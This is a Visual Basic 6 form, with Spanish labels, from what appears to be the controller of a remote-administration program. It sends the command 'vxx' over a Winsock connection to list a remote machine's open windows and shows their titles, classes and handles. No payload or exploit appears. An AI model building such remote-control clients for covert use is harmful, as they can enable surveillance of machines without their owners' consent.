VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form ventanas 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Ventanas abiertas"
   ClientHeight    =   5625
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   5715
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5625
   ScaleWidth      =   5715
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command3 
      Caption         =   "Cerrar ventana"
      Height          =   375
      Left            =   1680
      TabIndex        =   3
      Top             =   5160
      Width           =   1455
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   2160
      OleObjectBlob   =   "ventanas.frx":0000
      Top             =   5160
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Cerrar"
      Height          =   375
      Left            =   4080
      TabIndex        =   2
      Top             =   5160
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Listar ventanas"
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   5160
      Width           =   1455
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   4935
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   5415
      _ExtentX        =   9551
      _ExtentY        =   8705
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   3
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Key             =   "a"
         Object.Tag             =   "a"
         Text            =   "Texto"
         Object.Width           =   6068
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Key             =   "b"
         Object.Tag             =   "b"
         Text            =   "Clase"
         Object.Width           =   2187
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Key             =   "c"
         Object.Tag             =   "c"
         Text            =   "Direccion"
         Object.Width           =   1058
      EndProperty
   End
End
Attribute VB_Name = "ventanas"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim vIndex As Variant
Dim Index_n As Integer

Private Sub Command1_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    Form1.Winsock1(vIndex(0)).SendData "vxx"
Else
    Unload Me
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
End If
End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")


'Skin1.LoadSkin App.path & "\sk\skin.skn"
'Skin1.ApplySkin ventanas.hwnd
End Sub


Private Sub ListView1_DblClick()
MsgBox ListView1.SelectedItem.Text, vbInformation + vbOKOnly, "VENTANA"
End Sub
